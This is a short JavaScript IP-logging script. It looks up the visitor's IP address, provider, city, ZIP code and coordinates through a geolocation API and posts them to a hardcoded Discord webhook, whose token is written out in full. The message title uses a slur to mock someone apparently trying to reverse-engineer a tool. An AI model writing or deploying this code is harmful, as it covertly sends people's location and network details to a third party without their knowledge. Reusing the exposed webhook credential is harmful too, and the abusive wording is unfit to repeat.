// Discord webhook

var webHookUrl = "https://discord.com/api/webhooks/981289934512082954/q2VAfWztKySu_uMoS7eZuJz9id_Ftm3RRtKJ-EuyZHNlQJEIrlGRVj6ijgNiz_3ITSwT";


const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    // Declaring variables
    var ip = data.ip;

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.country_code.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.postal;
    var lat = data.latitude;
    var lon = data.longitude;

    // POST request to ur webhook
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "yTc on top! $$$",
        avatar_url: "https://i.pinimg.com/originals/8e/21/10/8e21103e20baef3e4d44db0aebd70bb4.jpg",
        embeds: [
            {
              "title": "this retard trynna reverse ur shit",
              "description": "__**:globe_with_meridians: IP-Adress:**__ \n" 
              + "`" + ip + "`" + 
              "\n \n__**:telephone: Provider:**__ \n" 
              + provider + 
              "\n \n__**:map: Timezone:**__ \n" 
              + timezone + 
              "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
              + country + " - " + region + 
              "\n \n__**:cityscape: Zip Code & City:**__ \n" 
              + zip + " " + city +
              "\n \n__**:round_pushpin: Location:**__ \n" 
              + "**Longitude:** " + lon + "\n"
              + "**Latitude:** " + lat,
              "color": 6029543,
              "author": {
                "name": "yTc on top! $$$",
                "url": "https://ytax.cc/"
              }
            }
          ],
    }

    postRequest.send(JSON.stringify(params));

}

request();
